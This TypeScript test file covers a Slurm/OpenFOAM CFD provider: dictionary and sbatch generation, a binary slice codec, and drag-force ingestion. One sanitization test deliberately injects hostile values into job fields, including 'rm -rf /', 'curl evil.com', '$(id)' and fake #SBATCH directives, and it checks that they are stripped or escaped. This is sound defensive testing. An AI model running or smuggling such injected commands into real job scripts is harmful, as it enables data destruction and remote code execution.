// SPDX-License-Identifier: AGPL-3.0-or-later

import assert from "node:assert";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import type { CfdSimulationJobSpec } from "../src/hpc/hpc-types.js";
import { InSituSliceCodec } from "../src/hpc/in-situ-telemetry.js";
import { HpcSlurmCfdProvider } from "../src/hpc/slurm-orchestrator.js";

test("Exchange HPC Slurm CFD Provider & In-Situ Telemetry Codec", async (t) => {
  await t.test("generateDecomposeParDict produces valid OpenFOAM dictionary for scotch and hierarchical", () => {
    const scotchDict = HpcSlurmCfdProvider.generateDecomposeParDict({
      method: "scotch",
      numberOfSubdomains: 64,
    });
    assert.ok(scotchDict.includes("numberOfSubdomains 64;"));
    assert.ok(scotchDict.includes("method          scotch;"));
    assert.ok(scotchDict.includes("scotchCoeffs"));

    const hierDict = HpcSlurmCfdProvider.generateDecomposeParDict({
      method: "hierarchical",
      numberOfSubdomains: 16,
      directionalSplit: [4, 2, 2],
      delta: 0.002,
    });
    assert.ok(hierDict.includes("numberOfSubdomains 16;"));
    assert.ok(hierDict.includes("n           ( 4 2 2 );"));
    assert.ok(hierDict.includes("delta       0.002;"));
  });

  await t.test("generateSbatchScript sanitizes directives and env variables against injection", () => {
    const spec: CfdSimulationJobSpec = {
      jobId: "cfd_job\n#SBATCH --exclusive",
      modelName: "AeroVehicle",
      solver: "simpleFoam",
      caseDir: "/tmp/case",
      cluster: {
        endpoint: "slurm.local:6820",
        scheduler: "slurm",
        partition: "gpu-h100\n#SBATCH --partition=root",
        nodes: 2,
        tasksPerNode: 16,
        cpusPerTask: 2,
        walltime: "02:00:00\nrm -rf /",
        modules: ["openfoam/v2312\ncurl evil.com"],
        env: {
          FOAM_SIGFPE: 'true"$(id)',
          "BAD-KEY;rm": "1",
        },
      },
      decomposition: {
        method: "scotch",
        numberOfSubdomains: 32,
      },
    };

    const sbatch = HpcSlurmCfdProvider.generateSbatchScript(spec);
    const directives = sbatch.split("\n").filter((l) => l.startsWith("#SBATCH"));

    assert.ok(!directives.some((l) => l.includes("--exclusive")), "Must strip newline injection in jobId");
    assert.ok(!directives.some((l) => l.includes("--partition=root")), "Must strip newline injection in partition");
    assert.ok(!sbatch.includes("rm -rf /"), "Must strip newline injection in walltime");
    assert.ok(!sbatch.includes("curl evil.com"), "Must strip newline injection in modules");
    assert.ok(!sbatch.includes("BAD-KEY"), "Must reject invalid env variable keys");
    assert.ok(sbatch.includes('export FOAM_SIGFPE="true\\"\\$(id)"'), "Must escape bash metacharacters in env values");
  });

  await t.test("InSituSliceCodec round-trips binary 2D planar cut slices losslessly", () => {
    const slice = InSituSliceCodec.synthesizeSlice([0, 0, 0.5], [0, 0, 1], [4.0, 2.0], [10, 5], 0.25, 5);
    const encoded = InSituSliceCodec.serialize(slice);
    const decoded = InSituSliceCodec.deserialize(encoded);

    assert.strictEqual(decoded.step, 5);
    assert.strictEqual(decoded.time, 0.25);
    assert.strictEqual(decoded.numVertices, 50);
    assert.strictEqual(decoded.numTriangles, 72);
    assert.ok(decoded.fields["velocityMagnitude"]);
    assert.ok(decoded.fields["pressure"]);
    assert.strictEqual(decoded.fields["velocityMagnitude"]!.length, 50);
  });

  await t.test(
    "HpcSlurmCfdProvider couples boundary inputs and ingests OpenFOAM forces.dat & binary slices",
    async () => {
      const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "exchange-hpc-cfd-"));
      try {
        const spec: CfdSimulationJobSpec = {
          jobId: "coupled_cfd_1",
          modelName: "CoupledWing",
          solver: "pimpleFoam",
          caseDir: tmpDir,
          cluster: {
            endpoint: "localhost",
            scheduler: "slurm",
            partition: "compute",
            nodes: 1,
            tasksPerNode: 4,
          },
          decomposition: {
            method: "scotch",
            numberOfSubdomains: 4,
          },
          telemetry: {
            enabled: true,
            sampleIntervalSteps: 1,
          },
        };

        const provider = new HpcSlurmCfdProvider(spec);
        await provider.initialize(0, 1.0, 0.1);

        // 1. Coupled input velocity modulates analytical aerodynamic drag when forces.dat is absent
        await provider.setInputs(new Map([["inlet_velocity", 30.0]]));
        await provider.doStep(0, 0.1);
        const out1 = await provider.getOutputs();
        const dragAt30 = out1.get("total_drag_force") as number;
        assert.ok(dragAt30 > 350, `Expected higher drag at 30 m/s, got ${dragAt30}`);
        assert.ok(fs.existsSync(path.join(tmpDir, "coupled_inputs.json")), "Should write coupled_inputs.json");

        // 2. Write OpenFOAM postProcessing/forces/0/forces.dat and verify live ingestion
        const forcesDir = path.join(tmpDir, "postProcessing", "forces", "0");
        fs.mkdirSync(forcesDir, { recursive: true });
        fs.writeFileSync(
          path.join(forcesDir, "forces.dat"),
          "# Time ((px py pz) (vx vy vz))\n0.2 ((512.5 10.0 0.0) (47.5 2.0 0.0))\n",
          "utf8",
        );

        // Write binary in-situ slice on disk
        const diskSlice = InSituSliceCodec.synthesizeSlice([1, 2, 3], [0, 1, 0], [2.0, 2.0], [6, 6], 0.2, 2);
        fs.writeFileSync(
          path.join(tmpDir, "postProcessing", "in_situ_slice.bin"),
          Buffer.from(InSituSliceCodec.serialize(diskSlice)),
        );

        await provider.doStep(0.1, 0.1);
        const out2 = await provider.getOutputs();
        assert.strictEqual(out2.get("total_drag_force"), 560.0, "Should sum pressure (512.5) + viscous (47.5) x-drag");

        const currentSlice = provider.getInSituSlice();
        assert.ok(currentSlice !== null);
        assert.strictEqual(currentSlice.numVertices, 36, "Should load 6x6 slice from postProcessing/in_situ_slice.bin");

        await provider.terminate();
      } finally {
        fs.rmSync(tmpDir, { recursive: true, force: true });
      }
    },
  );
});
